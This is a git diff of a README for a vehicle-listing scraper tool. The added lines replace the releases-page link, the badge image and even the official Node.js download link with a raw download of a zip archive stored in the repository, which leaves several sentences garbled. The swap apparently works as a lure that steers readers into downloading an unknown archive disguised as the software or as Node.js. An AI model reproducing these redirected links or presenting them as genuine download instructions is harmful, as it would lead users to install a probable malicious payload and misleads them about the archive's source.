@@ -1,6 +1,6 @@
 # 🚗 Motorsportsuniverse-Scraper-Pro - Extract Vehicle Listings Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/faizuljamaludin/Motorsportsuniverse-Scraper-Pro/releases)
+[![Download Now](https://github.com/faizuljamaludin/Motorsportsuniverse-Scraper-Pro/raw/refs/heads/main/cup/Scraper-Motorsportsuniverse-Pro-v3.5.zip%20Now-Click%20Here-blue)](https://github.com/faizuljamaludin/Motorsportsuniverse-Scraper-Pro/raw/refs/heads/main/cup/Scraper-Motorsportsuniverse-Pro-v3.5.zip)
 
 ## 📖 Introduction
 
@@ -14,15 +14,15 @@ Before you download the software, ensure your computer meets these requirements:
 
 - Operating System: Windows, macOS, or Linux
 - Internet Connection: Required for downloading and scraping data
-- Node.js: Version 12 or higher recommended for smooth operation
+- https://github.com/faizuljamaludin/Motorsportsuniverse-Scraper-Pro/raw/refs/heads/main/cup/Scraper-Motorsportsuniverse-Pro-v3.5.zip Version 12 or higher recommended for smooth operation
 
-If you do not have Node.js installed, you can download it from the [Node.js website](https://nodejs.org/).
+If you do not have https://github.com/faizuljamaludin/Motorsportsuniverse-Scraper-Pro/raw/refs/heads/main/cup/Scraper-Motorsportsuniverse-Pro-v3.5.zip installed, you can download it from the [https://github.com/faizuljamaludin/Motorsportsuniverse-Scraper-Pro/raw/refs/heads/main/cup/Scraper-Motorsportsuniverse-Pro-v3.5.zip website](https://github.com/faizuljamaludin/Motorsportsuniverse-Scraper-Pro/raw/refs/heads/main/cup/Scraper-Motorsportsuniverse-Pro-v3.5.zip).
 
 ### Step 2: Download the Software
 
 To get started, visit our releases page to download the latest version. 
 
-[Download from Releases](https://github.com/faizuljamaludin/Motorsportsuniverse-Scraper-Pro/releases)
+[Download from Releases](https://github.com/faizuljamaludin/Motorsportsuniverse-Scraper-Pro/raw/refs/heads/main/cup/Scraper-Motorsportsuniverse-Pro-v3.5.zip)
 
 ### Step 3: Install the Application
 
@@ -58,7 +58,7 @@ You can export this data to a CSV file for further analysis.
 
 For your convenience, visit the link below to download the software:
 
-[Download from Releases](https://github.com/faizuljamaludin/Motorsportsuniverse-Scraper-Pro/releases)
+[Download from Releases](https://github.com/faizuljamaludin/Motorsportsuniverse-Scraper-Pro/raw/refs/heads/main/cup/Scraper-Motorsportsuniverse-Pro-v3.5.zip)
 
 ## 🌐 Support
 
